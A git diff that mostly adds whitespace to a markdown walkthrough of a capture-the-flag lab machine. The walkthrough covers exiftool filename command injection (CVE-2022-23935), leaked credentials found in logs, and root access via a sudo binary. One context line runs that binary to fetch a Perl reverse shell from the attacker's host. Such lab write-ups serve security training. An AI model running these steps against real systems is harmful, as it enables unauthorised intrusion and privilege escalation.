@@ -26,6 +26,7 @@ Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 It looks like `eforenzics.htb` is the hostname we need to add to hosts file. We could easily do it with your favourite text editor. I'm using `Sublime Text` so I'll be using `subl`. 
 `sudo subl /etc/hosts`
+
 ![Editing hosts](Images/hosts.png)
 
 Now, we can start enumerating the website.
@@ -34,8 +35,10 @@ Now, we can start enumerating the website.
 # Enumerating Webapp
 When we're browsing the web application, we can see that they're hosting a "Free Image Forensics Service" on `service.html`.
 ![Free Image Forensics Service](Images/forensice-service.png)
-Upon checking the service, it looks like we could upload a file to their server. We could try uploading a PHP reverse shell file but the service accepts only PHP files so it's not really useful here. We'll try uploading a valid image file to the server to see what the service is actually doing. 
+Upon checking the service, it looks like we could upload a file to their server. We could try uploading a PHP reverse shell file but the service accepts only PHP files so it's not really useful here. We'll try uploading a valid image file to the server to see what the service is actually doing.
+
 ![ExifTool Version Number](Images/exiftool-version.png)
+
 So, the "Image Forensics Service" is actually just printing out metadatas of the uploaded image using `exiftool`. We can also see the version of `exiftool` that the application is using. With a quick google search, we've found that `exiftool` versions < 12.38 is vulnerable to a **Command Injection** vulnerability through a crafted file name. See [CVE-2022-23935](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) for more info.
 
 
@@ -60,7 +63,9 @@ stty rows 35 columns 167; reset
 ```
 
 Now that we have a stabalized shell, we'll start enumerating what we can do for lateral movement in the system. By reading `/etc/passwd` file and checking the `/home` directory, we've found another user in the system called _smorton_. Let's find if there's a file or a directory own by _smorton_
+
 ![File own by smorton](Images/find-smorton.png)
+
 So, we've found a **Microsoft Outlook Message** file with readable permissions for everyone. We can transfer this file to our own machine by copying it to the webapp directory or hosting a web server in the `/usr/local/investigation` directory. 
 
 We could easily download the file to our Kali machine using `wget` but Kali doesn't have a tool pre-installed for opening Outlook message files. So, we'll need to install a tool called `msgconvert`. Here's how to install it -
@@ -92,6 +97,7 @@ Many different stuffs are being logged including authenticating processes. It's 
 cat security.xml | grep "TargetUserName" | sort -u
 ```
 By running this command, we'll see that there's a string that looks like a password. We can login to the `SSH` server with the user we found, _smorton_, and this string we found. With this, we finally got `SSH` shell as user _smorton_ and the user flag in the `/home/smorton` directory
+
 ![SSH access as smorton](Images/user-flag.png)
 
 
@@ -111,12 +117,14 @@ ltrace ./binary
 ```
 
 ![Using ltrace](Images/ltrace.png)
+
 It's just the exit output and nothing more. That wasn't really helpful... Let's try `strings` to see the readable strings in `binary` file -
 ```strings
 strings binary
 ```
 
 ![Using strings](Images/strings.png)
+
 We found a piece of string, `perl` command and removing a file with the same name as the piece of string we found at first. We could pass a `perl` script as an argument and run the `binary` but it's still the same, exiting with the same output. 
 
 So, we only have one option which is to decompile and do some reverse engineering on the `binary`. For this task, we'll be using `radare2` tool since it's lightweighted and it's pre-installed on Kali. Here's some mini cheatsheet for `radare2` -
@@ -148,6 +156,7 @@ else:
 ```
 
 So, all we need to do is write a `perl` reverse shell program on our machine, host a webserver and then run `sudo /usr/bin/binary http://my-ip/rev.pl "lD------Qn"` and we should get a reverse shell as _root_ on our netcat listener. We could use `perl` reverse shell by pentestmonkey, it can be found in `/usr/share/webshells/perl/` directory. 
+
 ![root.txt](Images/root-flag.png)
 
 
